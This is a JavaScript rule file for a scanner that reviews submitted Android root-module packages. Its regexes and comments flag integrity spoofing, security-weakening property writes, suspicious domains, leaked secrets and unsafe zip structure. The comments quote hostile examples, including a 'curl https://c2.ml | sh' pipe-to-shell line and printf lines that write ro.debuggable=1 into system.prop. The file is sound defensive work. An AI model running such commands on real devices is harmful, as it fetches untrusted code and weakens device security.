const BOOT_STATE_KEYS = 'ro\\.boot\\.(?:verifiedbootstate|vbmeta\\.device_state|flash\\.locked|veritymode)\\s*=';
// fix5-F2：这一份不再自己写键值对 —— 与脚本侧 DEBUGGABLE_ENABLE 共用 SECURITY_WEAKEN_PAIRS，
// 两边不可能各说各话。生成的字面量与旧的手写串逐字符等值（键序、`\\s*=\\s*`、尾部 `(?![0-9.])` 都没变），
// 变的只有 DEBUGGABLE_ENABLE 那一侧：它以前看值 `[01]` 两个方向都收，现在只收这个表里的削弱值。
const WEAKEN_KEYS = '(?:'
  + SECURITY_WEAKEN_PAIRS.map((p) => `${reEsc(p.key)}\\s*=\\s*${p.weaken}`).join('|')
  + ')(?![0-9.])';
const WRITE_FORM = '(?:^|[^\\w])(?:printf|echo|cat|tee)\\b[^|;&\\n]*["\']?\\s*';

export const PROP_BOOT_SPOOF = makeLineRule({
  anchor: 'line-start', // fix4-P14：这一支只在行首成立（.prop 的键就在行首）；行中形态见本规则第二支（anchorSibling 指它自己）
  anchorSibling: 'PROP_BOOT_SPOOF',
  id: 'PROP_BOOT_SPOOF', category: 'root', severity: 'high', title: '在属性文件里直写启动/完整性状态',
  // 第一支（行首）：注释行 `#ro.boot.verifiedbootstate=green` 与 module.prop 的
  // `description=ro.boot.verifiedbootstate=green` 都不命中（说明文字不是配置），真实 .prop 条目照常命中。
  // 第二支（fix4-P13，脚本写出）：简报在 d235927 上实测这两条是 0 命中 ——
  //   service.sh  printf "ro.boot.verifiedbootstate=green\n" >> /data/adb/modules/x/system.prop
  //   service.sh  echo "ro.boot.verifiedbootstate=green" >> system.prop
  // 「不改脚本、只在刷写时把属性写进 .prop」与直写 system.prop 是同一个意图的同一个机制，
  // 只是换了个入口文件；缺这一支时整条通道只有邻居规则 MODDIR_RUNTIME_WRITE 在写 $MODDIR/ 绝对路径时
  // 才顺带抓到（写相对路径 system.prop 时实测整包 0 发现 → low → auto-approve）。
  exclude: isDocOnlyMention, // 整行注释仍然豁免；说明位（没有重定向）本来也进不了第二支
  pattern: new RegExp(`(?:^\\s*${BOOT_STATE_KEYS}|${WRITE_FORM}${BOOT_STATE_KEYS}[^|;&\\n]*>>?)`, 'm'),
  advice: '绕过完整性校验（Play Integrity / 安全检测）。它与模块自称的功能是否相符，只能人来判。',
});

// fix3-P9：同一意图换个机制就完全免检 —— `ro.debuggable=1` 写进 system.prop 实测是 0 hits，
// 而它经由 resetprop/setprop 就是 DEBUGGABLE_ENABLE medium。`.prop` 是 Magisk 最惯用的通道
// （不改脚本，只写属性文件），所以这条必须存在，否则「用 setprop 还是写 .prop」决定过不过闸。
// 范围严格锁死在**具名键 + 削弱值**这四种配对上（简报点名的集合），不是「任何 ro. 键」：
//   ro.debuggable=1 / ro.secure=0 / ro.adb.secure=0 / service.adb.root=1
// 因此这些都不命中：`ro.product.model=Pixel7`（改机型）、`debug.sf.hw=1`（图形开关）、
// `ro.debuggable=0` 与 `ro.secure=1`（no-op，本来就是安全值）、`ro.debuggable=12`（不是那个值）。
// severity `medium`：镜像脚本侧那条同档 —— `high` 已经拍给启动/完整性状态伪造（上面 PROP_BOOT_SPOOF），
// 这里是「放宽调试面」而不是「伪造校验结果」，档位不该混。
// 行首那一支的理由与 PROP_BOOT_SPOOF 一致：`description=ro.debuggable=1 只是说明` 是文案不是配置；
// 第二支（fix4-P13）管的是脚本把这个键写进属性文件的那条通道，两条共用同一份 WEAKEN_KEYS。
export const PROP_SECURITY_WEAKEN = makeLineRule({
  anchor: 'line-start', // fix4-P14：这一支只在行首成立（.prop 的键就在行首）；行中形态见本规则第二支（anchorSibling 指它自己）
  anchorSibling: 'PROP_SECURITY_WEAKEN',
  id: 'PROP_SECURITY_WEAKEN', category: 'root', severity: 'medium',
  title: '在属性文件里直写削弱整机安全档位的键',
  // 第一支（行首）与 PROP_BOOT_SPOOF 同形；第二支（fix4-P13）认脚本把键写进属性文件的那条通道：
  //   printf "ro.debuggable=1\n" >> /data/adb/modules/x/system.prop   —— 简报实测 0 命中
  // 两支共用同一份 WEAKEN_KEYS，键表一个字都没动。
  exclude: isDocOnlyMention,
  pattern: new RegExp(`(?:^\\s*${WEAKEN_KEYS}|${WRITE_FORM}${WEAKEN_KEYS}[^|;&\\n]*>>?)`, 'm'),
  advice: 'ro.debuggable / ro.secure / ro.adb.secure / service.adb.root 决定整机能不能被调试、adb 要不要授权；'
    + '写进 .prop 就是在刷机后长期降档，作者必须在描述里说明为什么模块需要它。',
});

// ---------------------------------------------------------------------------
// ③ 外联
// ---------------------------------------------------------------------------

const PRIVATE_IP = /^(?:127\.|10\.|192\.168\.|172\.(?:1[6-9]|2\d|3[01])\.|0\.0\.0\.0$|255\.255\.255\.255$)/;

export const HARDCODED_IP = makeLineRule({
  anchor: 'anywhere', // fix4-P14：载荷出现在一行里任何位置都算（闭包表会用「x=1; 」前缀逐条验证）
  id: 'HARDCODED_IP',
  category: 'network',
  severity: 'medium',
  title: '硬编码 IP 地址',
  advice: '应改用域名。硬编码 IP（尤其公网 IP）常意味着无法追溯的 C2 或自建分发点。',
  pattern: /(?:\d{1,3}\.){3}\d{1,3}(?::\d{1,5})?/,
  exclude: /^\s*#|versionCode|versionName|version\s*=/,
  severityFor(m) {
    return PRIVATE_IP.test(m[0]) ? 'low' : 'medium';
  },
});

const SUSPICIOUS_TLD = /\.(?:xyz|top|tk|ml|ga|cf|gq|pw|cc|icu|rest|cyou|buzz|click|link|monster|su|live|lol)\b/i;
const SUSPICIOUS_KEYWORD = /(?:telemetry|tracker|tracking|analytics|adservice|ads?\.(?:com|net)|doubleclick|googlesyndication|googletagmanager|umeng|talkingdata|appsflyer|adjust\.com|branch\.io|sentry\.io|mixpanel|amplitude|bugly|jiagu|igexin)/i;

// ---------------- P10：SUSPICIOUS_DOMAIN 的 severity 判据（唯一实现点在这里） ----------------
// 改前的形状：host 命中 SUSPICIOUS_TLD 就发 medium，没有任何上下文判据。于是真包里两类东西一起响：
//   DOM/CSS 属性访问 `t.style.top`、`window.innerHeight-e.top`（device_faker / Integrity-Box 共 19 条）
//   反向 DNS 包名 `com.tencent.tmgp.cf`（device_faker config.toml:95）
// 用户 2026-10-14 拍的修法（计划 §2.6「已拍定（第三批）」、§0.22 末段）：判据换成**贴着匹配点边界**的三个锚点，
// 强锚点 ⇒ medium、反向 DNS 包名 ⇒ info、弱锚点 ⇒ medium、都没有 ⇒ info。
// ⚠ 这是**放宽方向**（收窄拦截范围），不是补洞：投稿者可以把 C2 域名塞成「没有锚点」的形状换 info。
//   实物税已经在真包里：`Yuri/clear_all_detection_traces.sh:51` 的 `aidepro.top` 本轮起降成 info，
//   钉成夹具 T-P10-B5，不许写成误报修复。
// 三条硬约束（工单 §2）：
//   1. 判据只许有一份 —— 三条锚点是下面三个具名谓词，severity 的分派只在 severityFor 里；
//      不许在 scan.mjs 后处理、不许新增第二条 `SUSPICIOUS_DOMAIN_*` 规则（fix6-F1 的病：两套口径早晚会分叉）。
//   2. 降的是 severity，不是删证据 —— 返回 'info' 而不是 null，也不许写成 'low'：
//      finding 仍留在 report.findings 里（人看得见「这里有个可疑 TLD 形状，我判它是属性/包名」），
//      而 countsTowardRisk('info') === false，所以不抬等级。
//   3. 不做 ±W 邻域窗口 —— 实测三条紧邻信号下 W 取 12/24/40 结果一字不变，而「窗口里出现过 ://、url、host」
//      这类松信号在压缩产物上 W=24 只降 11/20、W=80 反而只剩 7/20（计划 §0.21 第 3 条、briefs/p10-measurement-note.md）。
//      判别力来自「锚在匹配点边界」，不是「窗口宽度」。
// 这段历史的两次自我推翻（必须留着，不然下一轮会在同一个坑里再摔一次）：
//   · 计划 §0.9（原第 576 行那一版）提出「首个 label 是反向 DNS 保留字 ⇒ info」，当天被**作者自己**在
//     §0.11 结论四否掉，理由是「豁免的是一个投稿者可造的形状」：谁都能注册 `evil.tk`，
//     在包里写 `com.evil.tk/payload`，首段是 `com`、同行也没有取用上下文 ⇒ 真 C2 白拿包名豁免。
//   · 本轮按 §2.6 用户重拍执行，但那条反对理由**仍然成立**，所以把它做成判据的边界而不是忽略它：
//     强锚点（①scheme 一路连到匹配点 / ②后面紧跟 `/path`）**压过**包名豁免 ⇒ `com.evil.tk/payload`
//     因为②必须仍是 medium（夹具 T-P10-A3）。反过来，包名豁免必须**优先于弱锚点③（引号）**，
//     否则真包那条整体在引号里的 `com.tencent.tmgp.cf` 关不掉，device_faker 只到 5/6（夹具 T-P10-B3）。
//     ⇒ 顺序写成 强锚点 → 包名 → 弱锚点 → info，不是三个并列 if。
const REVERSE_DNS_RESERVED_LABEL = /^(?:com|org|net|cn|gov|edu|mil|int)$/i; // 就这八个，一个都不许多：见 severityFor 里的说明
const QUOTE_AT_MATCH_BOUNDARY = /["'`]/;

// ① 强锚点：匹配点**前面紧邻** `https?://`，且 scheme 一路连到它 —— 中间没有空白、没有引号。
// 从匹配点向左走，一碰到空白或引号就否（那条 scheme 属于另一个 token），碰到 `://` 就检查它左边是不是 `http:`/`https:`。
function anchorSchemeConnects(line, at) {
  for (let q = at - 1; q >= 2; q--) {
    const c = line[q];
    if (c === '"' || c === "'" || c === '`' || c === ' ' || c === '\t' || c === '\f' || c === '\v') return false;
    if (c === '/' && line[q - 1] === '/' && line[q - 2] === ':') {
      // 右界必须是 q-1（含冒号）：q-2 就是那个 `:`，写成 slice(..., q-2) 截出来永远以 `https`
      // 结尾、不含冒号，/https?:$/ 恒假 ⇒ ①整支变死码，`curl https://c2.ml | sh` 掉到 info
      // （比改前的行级判据还松）。夹具 P10-A7 钉的就是这一格。
      return /https?:$/i.test(line.slice(Math.max(0, q - 8), q - 1));
    }
  }
  return false;
}

// ② 强锚点：匹配点**后面紧邻** `/` + 路径字符。压成「取用上下文」的那条路：域名后面跟路径就是当 URL 用。
// 代价（§0.21 未量的一面）：`x.top/2` 这种 CSS/JS 写法也算数 ⇒ 留在 medium，属可接受的偏严一侧。
function anchorPathFollows(line, end) {
  return line[end] === '/' && /[A-Za-z0-9._~%-]/.test(line[end + 1] || '');
}

// ③ 弱锚点：匹配点**整体被引号包住**（`["'`]host["'`/]`）。弱在「字符串字面量里放域名」很常见，
// 所以它排在包名豁免之后 —— 这是叠加顺序的设计，不是并列。
function anchorQuotedAround(line, at, end) {
  const before = at > 0 ? line[at - 1] : '';
  const after = end < line.length ? line[end] : '';
  return QUOTE_AT_MATCH_BOUNDARY.test(before)
    && (QUOTE_AT_MATCH_BOUNDARY.test(after) || after === '/');
}

/** P10 三条紧邻锚点的唯一入口：返回成立的那条（'scheme' | 'path' | 'quoted'），都不成立返回 null。
 *  顺序即强度：强锚点先判，弱锚点（③）最后判。 */
function suspiciousDomainAnchor(line, m) {
  const at = m.index;
  const end = at + m[0].length;
  if (anchorSchemeConnects(line, at)) return 'scheme';
  if (anchorPathFollows(line, end)) return 'path';
  if (anchorQuotedAround(line, at, end)) return 'quoted';
  return null;
}

/** 首个 label 是不是反向 DNS 保留字（整词、大小写不敏感）。
 *  ⚠ 词表就八个：`io`/`dev`/`me`/`xyz` 看着也像包名前缀，但它们本身就是可疑 TLD，
 *  收进来等于送出一条「投稿者改个包名前缀就能换 info」的豁免门。
 *  已知残留 FP：`io.github.foo.ml` 因此**留在 medium**（夹具 T-P10-A6 / 计划 §3 B4）——
 *  §0.9 那版谓词当年要求它「不再是 medium」，那是被 §0.11 结论四否掉的那版口径，本轮不照它做。 */
function isReverseDnsPackageName(host) {
  return REVERSE_DNS_RESERVED_LABEL.test(host.split('.')[0]);
}

export const SUSPICIOUS_DOMAIN = makeLineRule({
  anchor: 'anywhere', // fix4-P14：载荷出现在一行里任何位置都算（闭包表会用「x=1; 」前缀逐条验证）
  id: 'SUSPICIOUS_DOMAIN',
  category: 'network',
  severity: 'medium',
  title: '可疑域名（免费/匿名 TLD 或遥测广告特征）',
  // message 由工厂固定成 title（同一条规则各档共用），所以「这一档为什么这么判」写在 advice 上，
  // 报告表格里那一列就是它 —— 降级的两条理由必须让人看得见，不能只藏在代码里。
  advice: '确认该域名用途。遥测/广告 SDK 域名在 root 模块中出现需作者明确说明。'
    + '反向 DNS 包名形状（首段是 com/org/net/cn/gov/edu/mil/int）与没有任何取用上下文的属性访问按 info 记录：'
    + '证据仍在报告里，但不抬等级。',
  pattern: /\b(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z]{2,24}\b/i,
  exclude: /^\s*#|localhost|android\.com|github\.com|githubusercontent\.com|magisk|kernelsu|kernelsu\.org|topjohnwu|google\.com|googleapis\.com|gstatic\.com|w3\.org|schema\.org|json\.org|example\.com/,
  severityFor(m, line) {
    const host = m[0].toLowerCase();
    // 1) 遥测那一支本轮不碰（没有误报证据），且它排在锚点判据之前 —— 夹具 T-P10-A5 钉住它别被新顺序带歪。
    if (SUSPICIOUS_KEYWORD.test(host)) return 'medium';
    // 2) 不命中可疑 TLD ⇒ 照旧不构成发现。
    if (!SUSPICIOUS_TLD.test(host)) return null;
    // 3) 强锚点优先：①scheme 一路连到匹配点 / ②后面紧跟 /path。没有它们，恶意域名伪装成
    //    `com.evil.tk/payload` 就能白拿包名豁免（§0.11 结论四那条反对理由说的正是这个）。
    const anchor = suspiciousDomainAnchor(line, m);
    if (anchor === 'scheme' || anchor === 'path') return 'medium';
    // 4) 反向 DNS 包名 ⇒ info。**必须优先于弱锚点③**，否则整体在引号里的真包名关不掉（§0.22 末段）。
    if (isReverseDnsPackageName(host)) return 'info';
    // 5) 弱锚点③：整体在引号里的字符串字面量 ⇒ medium。
    if (anchor === 'quoted') return 'medium';
    // 6) 三条锚点与包名都不成立 ⇒ 「无取用上下文」，info。本轮接受的代价（夹具 T-P10-B5 就是这一格的真包实物）。
    return 'info';
  },
});

// 注意：severityFor 返回 null 时应丢弃该条；makeLineRule 需要支持，见下方包装
const SUSPICIOUS_DOMAIN_RULE = {
  ...SUSPICIOUS_DOMAIN,
  scan(file, text) {
    return SUSPICIOUS_DOMAIN.scan(file, text).filter((f) => f.severity !== null);
  },
};

export const NETWORK_FETCH = makeLineRule({
  anchor: 'anywhere', // fix4-P14：载荷出现在一行里任何位置都算（闭包表会用「x=1; 」前缀逐条验证）
  id: 'NETWORK_FETCH',
  category: 'network',
  severity: 'low',
  title: '存在网络下载行为',
  advice: '列出所有外联地址供人工核对；模块应尽量避免在运行期下载代码。',
  pattern: /https?:\/\/[^\s"'<>|`)]+/,
});

// ---------------------------------------------------------------------------
// ④ 投稿者隐私（保护投稿者，不计入风险等级）
// ---------------------------------------------------------------------------

const GENERIC_USER = /^(?:root|user|admin|none|null|home|users|default|test|ubuntu| Administrator)$/i;

export const PRIVACY_HOME_USER = makeLineRule({
  anchor: 'anywhere', // fix4-P14：载荷出现在一行里任何位置都算（闭包表会用「x=1; 」前缀逐条验证）
  id: 'PRIVACY_HOME_USER',
  category: 'privacy',
  severity: 'info',
  title: '绝对路径中暴露本机用户名',
  advice: '发布前请把路径改为相对路径或占位符，避免泄露投稿者的系统账号名。',
  pattern: /(?:\/home\/[A-Za-z0-9._-]+|\/Users\/[A-Za-z0-9._-]+|[A-Za-z]:\\Users\\[^\\\s"'|`)]+)/,
  severityFor(m) {
    const name = m[0].split(/[/\\]/).pop();
    return GENERIC_USER.test(name) ? null : 'info';
  },
});

export const PRIVACY_EMAIL = makeLineRule({
  anchor: 'anywhere', // fix4-P14：载荷出现在一行里任何位置都算（闭包表会用「x=1; 」前缀逐条验证）
  id: 'PRIVACY_EMAIL',
  category: 'privacy',
  severity: 'info',
  title: '疑似邮箱地址',
  advice: '如非必要请移除或使用公共联系邮箱。',
  pattern: /[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}/,
  // 仅排除“明显是占位/机器人”的地址；真实邮箱（哪怕域名是 example.com）仍提示投稿者
  exclude: /@users\.noreply\.github\.com|@localhost|@example\.(?:invalid|test)|@(?:noreply|no-reply)\./,
});

export const PRIVACY_SECRET = makeLineRule({
  anchor: 'anywhere', // fix4-P14：载荷出现在一行里任何位置都算（闭包表会用「x=1; 」前缀逐条验证）
  id: 'PRIVACY_SECRET',
  category: 'privacy',
  severity: 'info',
  title: '疑似密钥/Token/口令',
  advice: '立即吊销并移除。任何凭据都不应随模块 zip 发布。',
  pattern: /\bAKIA[0-9A-Z]{16}\b|\bsk-[A-Za-z0-9_-]{16,}\b|\bghp_[A-Za-z0-9]{20,}\b|\bxox[baprs]-[A-Za-z0-9-]{10,}\b|BEGIN (?:RSA |EC |DSA |OPENSSH |PGP )?PRIVATE KEY|\b(?:token|access[_-]?token|password|passwd|pwd|api[_-]?key|secret|access[_-]?key)\s*[=:]\s*["']?[A-Za-z0-9_\-./+]{6,}/i,
  exclude: /^\s*#|\$[{(]?[A-Za-z_][A-Za-z0-9_]*[)}]?\s*$|\s*=\s*["']?\$/, // 纯变量引用不算泄露
});

// ---------------------------------------------------------------------------
// 规则表
// ---------------------------------------------------------------------------

export const CONTENT_RULES = [
  RM_RF_MUTABLE,
  PIPE_TO_SHELL,
  EXEC_BUNDLED_FILE,
  EXEC_INDIRECT,
  MODDIR_RUNTIME_WRITE,
  DOWNLOAD_THEN_EXEC,
  DOWNLOAD_TO_MODULE_EXEC,
  DOWNLOAD_TO_STDOUT,
  OBFUSCATED_DECODE_EXEC,
  OBFUSCATED_DECODE_ONLY,
  WRITE_SYSTEM_VENDOR,
  SELINUX_DISABLE,
  HOSTS_MODIFY,
  SELINUX_POLICY_RELAX,
  SELINUX_TYPE_PERMISSIVE,
  MAGISK_POLICY_LIVE,
  VERIFIED_BOOT_SPOOF,
  DEBUGGABLE_ENABLE,
  PROP_BOOT_SPOOF,
  PROP_SECURITY_WEAKEN,
  HARDCODED_IP,
  SUSPICIOUS_DOMAIN_RULE,
  NETWORK_FETCH,
  PRIVACY_HOME_USER,
  PRIVACY_EMAIL,
  PRIVACY_SECRET,
];

export const RULES_BY_ID = Object.fromEntries(CONTENT_RULES.map((r) => [r.id, r]));

/** 对单个文件跑全部内容规则 */
export function scanContent(file, text, rules = CONTENT_RULES) {
  const out = [];
  for (const r of rules) out.push(...r.scan(file, text));
  return out;
}

/** 过滤掉 severityFor 返回 null 的条目（规则内部已处理，这里再做一次保险） */
export function dropNullSeverity(findings) {
  return findings.filter((f) => f && f.severity != null);
}

// ---------------------------------------------------------------------------
// ⑤ 元数据一致性（module.prop vs 投稿表单声明）
// ---------------------------------------------------------------------------

export const ID_PATTERN = /^[a-zA-Z][a-zA-Z0-9._-]*$/;

/**
 * 解析 module.prop 文本为 { fields: {key: {value, line}}, raw }
 * @param {string} text
 */
export function parseModuleProp(text) {
  const fields = {};
  const lines = String(text == null ? '' : text).split(/\r?\n/);
  lines.forEach((line, i) => {
    const t = line.trim();
    if (!t || t.startsWith('#')) return;
    const eq = t.indexOf('=');
    if (eq <= 0) return;
    const key = t.slice(0, eq).trim();
    const value = t.slice(eq + 1).trim();
    if (!(key in fields)) fields[key] = { value, line: i + 1 };
  });
  return { fields, raw: text };
}

/**
 * 元数据一致性检查（纯函数）
 * @param {{ present: boolean, path?: string, fields?: object }} prop
 * @param {{ id?: string, version?: string }} declared 投稿表单声明
 * @returns {Finding[]}
 */
export function checkMetadata(prop, declared = {}) {
  const out = [];
  const push = (ruleId, severity, message, advice, file, line, snippet) =>
    out.push({ ruleId, category: 'metadata', severity, file, line, snippet: trimSnippet(snippet || ''), message, advice });

  if (!prop || !prop.present) {
    push('META_PROP_MISSING', 'medium', 'zip 内缺少 module.prop',
      'module.prop 是模块的唯一身份来源，缺失则无法入库。', prop && prop.path ? prop.path : 'module.prop', 0, '');
    return out;
  }

  const fields = prop.fields || {};
  const file = prop.path || 'module.prop';

  for (const key of ['id', 'version']) {
    if (!fields[key]) {
      push(`META_FIELD_MISSING_${key.toUpperCase()}`, 'medium', `module.prop 缺少 ${key} 字段`,
        `${key} 为必填字段，缺失无法与投稿表单比对。`, file, 0, '');
    }
  }

  const actualId = fields.id ? fields.id.value : '';
  const actualVersion = fields.version ? fields.version.value : '';

  if (actualId && !ID_PATTERN.test(actualId)) {
    push('META_ID_FORMAT', 'low', `module id 不符合命名规范：${actualId}`,
      'id 应以字母开头，仅含字母、数字、点、下划线、连字符。', file, fields.id.line, `id=${actualId}`);
  }

  if (declared && declared.id && actualId && declared.id !== actualId) {
    push('META_ID_MISMATCH', 'medium',
      `module.prop 的 id 与投稿表单声明不一致（包内 ${actualId} / 表单 ${declared.id}）`,
      '以包内 module.prop 为准；请让投稿者修正表单或重新打包。', file, fields.id.line,
      `id=${actualId}（声明为 ${declared.id}）`);
  }

  if (declared && declared.version && actualVersion && declared.version !== actualVersion) {
    push('META_VERSION_MISMATCH', 'medium',
      `module.prop 的 version 与投稿表单声明不一致（包内 ${actualVersion} / 表单 ${declared.version}）`,
      '版本号决定索引更新，必须一致。', file, fields.version.line,
      `version=${actualVersion}（声明为 ${declared.version}）`);
  }

  return out;
}

export const METADATA_RULES = ['META_PROP_MISSING', 'META_FIELD_MISSING_ID', 'META_FIELD_MISSING_VERSION',
  'META_ID_FORMAT', 'META_ID_MISMATCH', 'META_VERSION_MISMATCH'];

// ---------------------------------------------------------------------------
// ⑥ 包结构与审核覆盖度
// ---------------------------------------------------------------------------
//
// 这一节不看脚本内容，只看 zip 自己声明的元数据，因为它防的是另一类问题：
// 「规则读到的条目」和「安装器解压出来的条目」不是同一个东西。内容规则写得再强，
// 也挡不住下面这些手法：
//   * 同名重复条目 —— 有的实现取第一个，有的取最后一个，审核看到的是前者；
//   * ../ 上跳与绝对路径 —— 解压即写出模块目录之外；
//   * 符号链接 —— 把模块里的常规路径指向 /data/data/... ，脚本按 $MODDIR 写法
//     操作就落到别人家，而脚本本身一行危险模式都没有；
//   * 超高压缩比 —— 解压即打爆 runner；
//   * 加密条目 / 不支持的压缩方式 / 解压失败 —— 审核压根没读到那段字节。
// 最后一类尤其容易漏：读不到 ≠ 干净。所以这些必须是参与定级的 finding，
// 而不是塞进 warnings 里好看一眼就算完。

/** 单文件纳入报告与人工复核的上限，超出即视为覆盖度缺口 */
export const MAX_TEXT = 512 * 1024;
/** 条目数上限：模块包正常在几百个以内，再多只可能是打包脚本失误或故意堆量 */
export const MAX_ENTRIES = 3000;
/** 声明的解压后总字节上限 */
export const MAX_TOTAL_UNCOMPRESSED = 512 * 1024 * 1024;
/** 单条声明解压上限，也是内置解压器的硬上限（真正的防爆护栏在这里，而不是比值） */
export const MAX_ENTRY_UNCOMPRESSED = 64 * 1024 * 1024;
/** 声明压缩比超过该值即视为异常（比值只是意图信号，实际限制由上面那条兜住） */
export const MAX_RATIO = 200;

/**
 * 条目名是否会让解压写到模块目录之外。
 * 反斜杠单独处理：它多半是 Windows 打包工具的产物，而非恶意，但同样会让
 * `split('/')` 看不见 `..` 段，所以判断前必须先归一化。
 * @returns {string|null} 命中的原因，null 表示安全
 */
export function unsafePathReason(name) {
  const norm = String(name == null ? '' : name).replace(/\\/g, '/');
  if (!norm) return '空条目名';
  if (norm.startsWith('/')) return '绝对路径';
  if (/^[A-Za-z]:\//.test(norm)) return 'Windows 盘符绝对路径';
  if (norm.split('/').includes('..')) return '含 .. 的上跳路径';
  if (/\0/.test(norm)) return '条目名含 NUL';
  return null;
}

/**
 * 只靠前 16 字节判断是不是二进制负载。
 * 这里刻意不猜“像不像源码”，只认确定的可执行格式 + “开头就出现 NUL” 这一条：
 * 前者说明模块在往设备上塞机器码（静态行级规则对它无效），后者能抓住
 * 把 ELF 改名成 .txt / .json 规避扩展名分类的低级伪装。
 * @param {Uint8Array} head
 * @returns {{ id: string, why: string }|null}
 */
export function detectBinary(head) {
  const b = head && head.length ? head : null;
  if (!b) return null;
  const u = (i) => (i < b.length ? b[i] : -1);
  if (u(0) === 0x7f && u(1) === 0x45 && u(2) === 0x4c && u(3) === 0x46) return { id: 'ELF', why: 'ELF 可执行文件/共享库' };
  if (u(0) === 0x4d && u(1) === 0x5a) return { id: 'PE', why: 'Windows PE（MZ 头）' };
  // thin 32/64、fat 32/64 及其字节序反转。注意 0xCAFEBABE 同时也是 Java class 的头
  // 四字节 —— 两者在这里的结论一致（不是文本、不能逐行审），所以不再单列 CLASS。
  const MACHO = [
    [0xfe, 0xed, 0xfa, 0xce], [0xce, 0xfa, 0xed, 0xfe],
    [0xfe, 0xed, 0xfa, 0xcf], [0xcf, 0xfa, 0xed, 0xfe],
    [0xca, 0xfe, 0xba, 0xbe], [0xbe, 0xba, 0xfe, 0xca],
    [0xca, 0xfe, 0xba, 0xbf], [0xbf, 0xba, 0xfe, 0xca],
  ];
  if (MACHO.some((m) => m.every((v, i) => u(i) === v))) return { id: 'MACHO', why: 'Mach-O / fat 二进制（含 Java class 头）' };
  if (u(0) === 0x64 && u(1) === 0x65 && u(2) === 0x78 && u(3) === 0x0a) return { id: 'DEX', why: 'Android DEX' };
  for (let i = 0; i < Math.min(b.length, 512); i++) if (b[i] === 0x00) return { id: 'NUL', why: '开头即含 NUL，不是文本' };
  return null;
}

/**
 * 「魔数或 NUL 开头、但后面整块是明文脚本」的 polyglot 条目要不要追加进内容扫描面（feed）的阈值。
 * 判据是**严格大于**：0.851 进面，恰好 0.850 与 0.849 都不进 —— 夹具 T4-A3 钉的就是这一格。
 *
 * 这个数不是拍出来的：18 包（13 真包 + 5 老包）的 `binaries` 桶 228 条里，过线的恰好 2 条
 * （Pixelify 的 `dnd.descriptor` 0.875000 与 `music_detector.descriptor` 0.861524），
 * 把这 2 条逐字节喂进 `scanContent` 出 **0 条发现**；反面锚是真字体条目前 3000 B 的 0.340333
 * 与 `classes.dex` 最高 0.5232 —— 真机器码离这条线有 0.3 的余量。
 * ⇒ 阈值在真包侧不是空样本，它确实放两条进来，代价实测为 0 条新发现、0 个包翻转。
 */
export const POLYGLOT_MIN_PRINTABLE = 0.85;

/**
 * 整块可打印比例。量法写死在这儿，别人复现必须同法（工单 §0）：
 * 可打印 = `0x20–0x7E` ∪ `0x09 0x0A 0x0D`，**对整条目字节取比例**。
 *
 * 全仓只许有这一份实现：`detectBinary` 只看头 16 字节，判的是「这是不是机器码」；
 * 这里判的是「那串字节里有多少是人读得懂的正文」，两件事共用一份字符类早晚会分叉 ——
 * 夹具 T4-C1 数着 `scan.mjs` 里不许出现第二个字符类。
 * @param {Uint8Array|Buffer|string} bytes 条目字节；传字符串时按 UTF-8 取字节
 *   （就是 `readZip` 给的那份 `content` 转字节，与 18 包那次重量同法）
 * @returns {number} 0–1；空条目 0
 */
export function printableRatio(bytes) {
  const b = Buffer.isBuffer(bytes) ? bytes
    : bytes instanceof Uint8Array ? bytes
      : typeof bytes === 'string' ? Buffer.from(bytes, 'utf8')
        : null;
  if (!b || !b.length) return 0;
  let ok = 0;
  for (let i = 0; i < b.length; i++) {
    const v = b[i];
    if ((v >= 0x20 && v <= 0x7e) || v === 0x09 || v === 0x0a || v === 0x0d) ok++;
  }
  return ok / b.length;
}

/**
 * zip 元数据层面的结构检查（纯函数）。
 * @param {Array<{name:string, method?:number, compSize?:number, origSize?:number,
 *               encrypted?:boolean, isSymlink?:boolean, isDir?:boolean}>} entries
 * @returns {{ findings: Finding[], stats: object }}
 */
export function inspectStructure(entries = []) {
  const out = [];
  const push = (ruleId, severity, message, advice, file, snippet = '') =>
    out.push({ ruleId, category: 'structure', severity, file, line: 0,
      snippet: trimSnippet(snippet), message, advice });

  const list = Array.isArray(entries) ? entries : [];
  const files = list.filter((e) => e && !e.isDir);

  let totalOrig = 0;
  let totalComp = 0;
  let maxRatio = 0;
  let maxRatioName = '';
  let maxRatioSizes = '';

  const seen = new Map();
  const unsafe = [];
  const backslash = [];
  const symlinks = [];
  const encrypted = [];
  const oddMethod = [];

  for (const e of files) {
    const name = String(e.name == null ? '' : e.name);
    if (/\\/.test(name)) backslash.push(name);
    const reason = unsafePathReason(name);
    if (reason) unsafe.push({ name, reason });
    if (!seen.has(name)) seen.set(name, 0);
    seen.set(name, seen.get(name) + 1);
    if (e.isSymlink) symlinks.push(name);
    if (e.encrypted) encrypted.push(name);
    if (e.method != null && e.method !== 0 && e.method !== 8) oddMethod.push({ name, method: e.method });

    const orig = Number(e.origSize) || 0;
    const comp = Number(e.compSize) || 0;
    totalOrig += orig;
    totalComp += comp;
    if (comp > 0) {
      const r = orig / comp;
      if (r > maxRatio) { maxRatio = r; maxRatioName = name; maxRatioSizes = `orig=${orig} comp=${comp}`; }
    }
  }

  for (const { name, reason } of unsafe) {
    push('STRUCT_UNSAFE_PATH', 'high', `条目 ${name} 的路径不安全（${reason}）`,
      '禁止。安装器按条目名写出文件时，这一条会直接落到模块目录之外。请重新打包，路径全部用相对路径。', name);
  }
  for (const name of seen.keys()) {
    if (seen.get(name) > 1) {
      push('STRUCT_DUPLICATE_NAME', 'high', `条目名重复：${name} 出现 ${seen.get(name)} 次`,
        '禁止。审核只能确认其中一份的内容，而安装器到底解压哪一份取决于实现 —— 这正是「让扫描器看到干净的那份」的经典手法。请去掉重复条目。', name);
    }
  }
  for (const name of symlinks) {
    push('STRUCT_SYMLINK', 'high', `条目 ${name} 是符号链接`,
      '需人工确认。符号链接能把模块里的任意路径指向 /data/data、/system 等位置，脚本按常规写法操作就会写到别人家。', name);
  }
  for (const name of encrypted) {
    push('STRUCT_ENCRYPTED', 'medium', `条目 ${name} 被加密，审核读不到内容`,
      '读不到不等于干净。请提交不加密的模块包。', name);
  }
  for (const { name, method } of oddMethod) {
    push('STRUCT_UNSUPPORTED_METHOD', 'medium', `条目 ${name} 使用了审核不支持的压缩方式（method ${method}）`,
      '该行级规则无法覆盖这段字节。请改用 deflate 或 stored 重新打包。', name, `method=${method}`);
  }
  if (backslash.length) {
